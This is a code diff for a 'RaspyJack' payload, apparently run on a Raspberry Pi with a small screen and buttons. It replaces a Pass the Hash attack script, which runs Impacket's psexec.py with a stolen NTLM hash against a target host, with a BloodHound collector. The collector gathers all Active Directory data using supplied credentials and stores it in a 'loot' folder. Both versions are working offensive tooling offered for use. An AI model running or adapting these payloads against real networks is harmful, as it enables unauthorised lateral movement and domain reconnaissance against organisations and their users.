@@ -1,22 +1,22 @@
 #!/usr/bin/env python3
 """
-RaspyJack *payload* – **Pass the Hash Attack**
-==============================================
-This payload performs a Pass the Hash attack, which allows an attacker
-to authenticate to a remote server by using the user's NTLM hash instead
-of their password.
+RaspyJack *payload* – **BloodHound Data Collection**
+====================================================
+This payload uses the BloodHound data collector to gather information
+about the target domain. This information can then be used to identify
+attack paths and to plan lateral movement.
 
 Features:
-- Interactive UI for entering the target IP, username, and NTLM hash.
-- Uses Impacket's psexec.py to perform the attack.
-- The attack runs in a background thread.
+- Interactive UI for entering the domain, username, and password.
+- Uses bloodhound.py to collect data.
+- The collection process runs in a background thread.
 - Graceful exit via KEY3 or Ctrl-C.
 
 Controls:
 - MAIN SCREEN:
-    - OK: Start the attack.
-    - KEY1: Edit the target IP.
-    - KEY2: Edit the username and hash.
+    - OK: Start the collection.
+    - KEY1: Edit the domain.
+    - KEY2: Edit the username and password.
     - KEY3: Exit Payload.
 """
 
@@ -36,11 +36,11 @@ import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
-TARGET_IP = "192.168.1.100"
-USERNAME = "Administrator"
-NTLM_HASH = "00000000000000000000000000000000:00000000000000000000000000000000"
+DOMAIN = "example.com"
+USERNAME = "user"
+PASSWORD = "password"
 running = True
-attack_thread = None
+collection_thread = None
 
 PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
 GPIO.setmode(GPIO.BCM)
@@ -60,7 +60,7 @@ signal.signal(signal.SIGTERM, cleanup)
 def draw_ui(screen_state="main", message_lines=None):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    d.text((5, 5), "Pass the Hash Attack", font=FONT_TITLE, fill="#00FF00")
+    d.text((5, 5), "BloodHound Collector", font=FONT_TITLE, fill="#00FF00")
     d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
 
     if message_lines:
@@ -74,31 +74,35 @@ def draw_ui(screen_state="main", message_lines=None):
             d.text((x, y_offset), line, font=FONT, fill="yellow")
             y_offset += 12
     elif screen_state == "main":
-        d.text((5, 30), f"Target: {TARGET_IP}", font=FONT, fill="white")
+        d.text((5, 30), f"Domain: {DOMAIN}", font=FONT, fill="white")
         d.text((5, 50), f"User: {USERNAME}", font=FONT, fill="white")
-        d.text((5, 70), f"Hash: {NTLM_HASH[:10]}...", font=FONT, fill="white")
-        d.text((5, 100), "OK=Attack", font=FONT, fill="cyan")
-        d.text((5, 110), "KEY1=Target | KEY2=User/Hash", font=FONT, fill="cyan")
-    elif screen_state == "attacking":
-        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
-        d.text((5, 70), f"Target: {TARGET_IP}", font=FONT, fill="white")
+        d.text((5, 100), "OK=Collect", font=FONT, fill="cyan")
+        d.text((5, 110), "KEY1=Domain | KEY2=User/Pass", font=FONT, fill="cyan")
+    elif screen_state == "collecting":
+        d.text((5, 50), "Collecting data...", font=FONT_TITLE, fill="yellow")
+        d.text((5, 70), f"Domain: {DOMAIN}", font=FONT, fill="white")
         d.text((5, 85), f"User: {USERNAME}", font=FONT, fill="white")
 
     LCD.LCD_ShowImage(img, 0, 0)
 
-def run_attack():
-    draw_ui("attacking")
+def run_collection():
+    draw_ui("collecting")
     
-    # Path to psexec.py
-    psexec_path = os.path.join(RASPYJACK_ROOT, "impacket-examples", "psexec.py")
+    # Path to bloodhound.py
+    bloodhound_path = os.path.join(RASPYJACK_ROOT, "BloodHound.py", "bloodhound.py")
     
     # Command to execute
     command = [
         "python3",
-        psexec_path,
-        "-hashes",
-        NTLM_HASH,
-        f"{USERNAME}@{TARGET_IP}"
+        bloodhound_path,
+        "-d",
+        DOMAIN,
+        "-u",
+        USERNAME,
+        "-p",
+        PASSWORD,
+        "-c",
+        "all"
     ]
     
     try:
@@ -106,23 +110,28 @@ def run_attack():
         stdout, stderr = process.communicate(timeout=600)
         
         if process.returncode == 0:
-            draw_ui(message_lines=["Attack successful!"])
+            draw_ui(message_lines=["Collection successful!", "Check loot directory."])
+            
+            # Move the output files to the loot directory
+            loot_dir = os.path.join(RASPYJACK_ROOT, "loot", "bloodhound")
+            os.makedirs(loot_dir, exist_ok=True)
+            timestamp = time.strftime("%Y%m%d_%H%M%S")
+            for f in os.listdir("."):
+                if f.endswith(".json"):
+                    os.rename(f, os.path.join(loot_dir, f"{timestamp}_{f}"))
         else:
-            draw_ui(message_lines=["Attack failed!", "Check console."])
+            draw_ui(message_lines=["Collection failed!", "Check console."])
             print(stderr)
             
     except subprocess.TimeoutExpired:
-        draw_ui(message_lines=["Attack timed out!"])
+        draw_ui(message_lines=["Collection timed out!"])
     except Exception as e:
-        draw_ui(message_lines=["Attack failed!", str(e)])
+        draw_ui(message_lines=["Collection failed!", str(e)])
         
     time.sleep(3)
 
 def handle_text_input_logic(initial_text, text_type):
-    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-:"
-    if text_type == "Target IP":
-        char_set = "0123456789."
-        
+    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
     char_index = 0
     input_text = ""
     
@@ -175,14 +184,14 @@ if __name__ == "__main__":
             draw_ui("main")
             
             if GPIO.input(PINS["OK"]) == 0:
-                attack_thread = threading.Thread(target=run_attack)
-                attack_thread.start()
+                collection_thread = threading.Thread(target=run_collection)
+                collection_thread.start()
                 time.sleep(0.3)
             
             if GPIO.input(PINS["KEY1"]) == 0:
-                new_ip = handle_text_input_logic(TARGET_IP, "Target IP")
-                if new_ip:
-                    TARGET_IP = new_ip
+                new_domain = handle_text_input_logic(DOMAIN, "Domain")
+                if new_domain:
+                    DOMAIN = new_domain
                 time.sleep(0.3)
 
             if GPIO.input(PINS["KEY2"]) == 0:
@@ -190,9 +199,9 @@ if __name__ == "__main__":
                 if new_username:
                     USERNAME = new_username
                 
-                new_hash = handle_text_input_logic(NTLM_HASH, "NTLM Hash")
-                if new_hash:
-                    NTLM_HASH = new_hash
+                new_password = handle_text_input_logic(PASSWORD, "Password")
+                if new_password:
+                    PASSWORD = new_password
                 time.sleep(0.3)
 
             if GPIO.input(PINS["KEY3"]) == 0:
@@ -207,4 +216,4 @@ if __name__ == "__main__":
         cleanup()
         LCD.LCD_Clear()
         GPIO.cleanup()
-        print("Pass the Hash Attack payload finished.")
+        print("BloodHound Collector payload finished.")
